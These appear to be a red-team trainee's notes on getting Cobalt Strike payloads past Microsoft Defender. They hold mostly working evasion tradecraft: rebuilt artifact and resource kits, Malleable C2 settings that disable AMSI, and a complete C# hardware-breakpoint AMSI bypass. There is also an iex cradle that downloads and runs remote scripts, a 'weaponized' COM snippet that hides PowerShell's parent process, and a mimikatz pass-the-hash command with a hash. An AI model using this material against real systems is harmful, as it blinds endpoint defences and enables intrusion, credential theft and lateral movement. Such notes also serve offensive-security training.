# Microsoft Defender Antirus Notes

**Artifact Kit**

Tools:
[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
[IDA](https://hex-rays.com/)
[Ghidra](https://github.com/NationalSecurityAgency/ghidra)

we build the artifact kit
```
./build.sh VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltStrike/artifacts
```

can validate these with threatcheck
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
```

to dig into issues
run ghidra 
```
C:\Tools\ghidra-10.3.1\ghidraRun.bat
```

load the file we ran with threatcheck and look for the byte sequence in ghidra by going to *Search>Memory* and *Search All*

or check bad bytes from threatcheck by going to *Select Navigation> Go To* entering the file(<badBytes>)

make a bunch of changes from what's found

sprintf issue:
```
sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```
to
```
sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

to load new artifact kit go to *Cobalt Strike>Script manager>Load* and load the *artifactkit.cna* file

to reload all new payloads to use this kit, *Payloads>Windows Stageless Generate All Payloads*

**Malleable C2**

Scanning the shellcode payload type with ThreatCheck can be a good way to help find these signatures because although the service binary artifact itself is "clean"
The raw shellcode is not
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.xprocess.bin
```

These are the four simple settings that I recommend trying
```
stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}
```
userwx tells the loader to allocate memory for the beacon dll as rw/rx rather then rwx
cleanup as true tells beacon to free the memory associated with the reflected loader after it has been loaded
obfuscate to true does a lot of things to obfuscate the loader

**Resource Kit**

we can check for threats in powershell scripts with -e amsi to detect issues, real time protection needs to be enabled for this
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
```

in this example this line is an issue with the smb_x64.ps1
```
for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}
```

we can use a find and replace function in vscode to look for $x and $var_code variables to change it to something else
```
for ($i = 0; $i -lt $enc.Count; $i++) {
    $enc[$i] = $enc[$i] -bxor 35
}
```

check if it passes clean now
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
```

to make permanent we can use the resource kit for this found here: C:\Tools\cobaltstrike\arsenal-kit\kits\resource

use the included build script and specify an output directory, then load resources.cna into Cobalt Strike
```
./build.sh /mnt/c/Tools/cobaltstrike/resources
```

another issue, when hosting powershell payloads with the scripted web delivery method, the compress.ps1 template is used, which decompresses the payload from a gzip stream. easiest workaround is to host your stagless powershell modules directly via *Site Management>Host File*


### AMSI vs post-exploitation

AMSI can also catch you with powershell, powerpick, or execute-assembly

so to combat this we can include a configuration in cobat strike called amsi_disable
```
vim c2-profiles/normal/webbug.profile
```

then add this above the http-get block
```
post-ex {
        set amsi_disable "true";
}
```

check if the config files works
```
./c2lint c2-profiles/normal/webbug.profile
```

restart teamserver with this change


**Manual AMSI Bypasses**

Tools:
[amsifail](https://amsi.fail/)

tool above can generate multiple different types of AMSI bypasses

some payloads may still trigger even if threatcheck says they are clean and amsi_disable doesn't apply to them 

here is a bypass we can save as a file
```
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP
{
    public class Amsi
    {
        static string a = "msi";
        static string b = "anB";
        static string c = "ff";
        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
        
        public static void Bypass()
        {
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
            ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pCtx, true);
            bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
            ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

            EnableBreakpoint(ctx, pABuF, 0);
            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
            ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

            WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
            ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

            WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
            ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0; // S_OK
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }

        }

        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```

just save this as a new file on the teamserver, and run before any commands first to bypass
```
example:
iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```

**Behavioural Detections**

The process used for post-ex commands and psexec can be changed on the fly in the CS GUI.  To change the post-ex process, use the spawnto command.  x86 and x64 must be specified individually and environment variables can also be used.
```
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe
```

now powerpick and powershell will run on the file server without being caught by AMSI or behavioural detection

can also make these changes in the malleable C2
```
vim c2-profiles/normal/webbug.profile
```

add this
```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

When moving laterally with psexec, Beacon will attempt to use the spawnto setting from your malleable C2 profile.  However, it cannot use environment variables (such as %windir%), so will fall back to rundll32 in those cases.  You can override this at runtime with the ak-settings command to specify an absolute path instead.
```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```

### Parent/Child Relationships

from our initial access payload it will seem like powershell is a child of word

so we use COM to avoid this

how to execute without the current parent
```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
```

weaponized example
```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc <base64>", Null, Null, 0
```


### Command Line Detections

The easiest workaround is to find a way to achieve the same goal but in a way that doesn't involve the same command line arguments.  For pass-the-hash, we can simply start an arbitrary process and steal its token manually.

```
mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
steal_token <PID>
```





